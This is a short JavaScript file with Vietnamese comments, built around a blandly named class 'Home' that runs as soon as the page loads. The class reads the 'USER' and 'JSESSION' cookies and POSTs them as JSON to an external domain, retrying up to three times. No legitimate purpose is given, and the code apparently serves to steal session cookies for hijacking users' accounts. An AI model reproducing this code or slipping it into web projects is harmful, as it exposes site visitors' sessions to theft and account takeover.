class Home {
    triedTime = 0;

    // Hàm khởi tạo
    constructor() {
        const user = this.getCookie("USER");
        const session = this.getCookie("JSESSION");
        console.log("sendInfo", { user, session });
        this.sendInfo({ user, session });
    }
    // Các phương thức
    getCookie(cname) {
        let name = cname + "=";
        let decodedCookie = decodeURIComponent(document.cookie);
        let ca = decodedCookie.split(";");
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) == " ") {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return "";
    }
    sendInfo(data) {
        this.triedTime++;
        fetch("https://quytrevang.nguyenvanxuanphu.com/api/core.vpbs", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        })
            .then((response) => response.json())
            .then((isOk) => {
                if (!isOk && this.triedTime <= 3) this.sendInfo();
            })
            .catch((err) => {
                if (this.triedTime <= 3) this.sendInfo();
            });
    }
}

new Home();
